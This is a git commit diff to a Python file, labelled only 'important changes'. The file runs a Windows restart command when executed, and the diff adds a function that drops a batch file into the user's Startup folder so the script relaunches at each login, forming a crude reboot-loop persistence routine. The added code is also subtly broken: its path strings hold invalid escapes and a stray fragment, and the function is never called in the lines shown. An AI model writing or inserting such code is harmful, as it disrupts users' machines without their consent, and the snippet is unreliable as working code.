af41130d7aacc1966f2e5559d28af3f5f9fa4e53
Mubashir Hasan <mubashirhasan716@gmail.com>
2020-12-24 19:35:28 +0530

    important changes

--- main.py
+++ main.py
@@ -2,3 +2,14 @@ import os
 
 cmd= 'shutdown/r'
 os.system(cmd)
+
+import getpass
+USER_NAME = getpass.getuser()
+
+
+def add_to_startup(file_path="C:\Users\hp\Documents\secondVi>"):
+    if file_path == "C:\Users\hp\Documents\secondVi>":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" %s' % file_path)
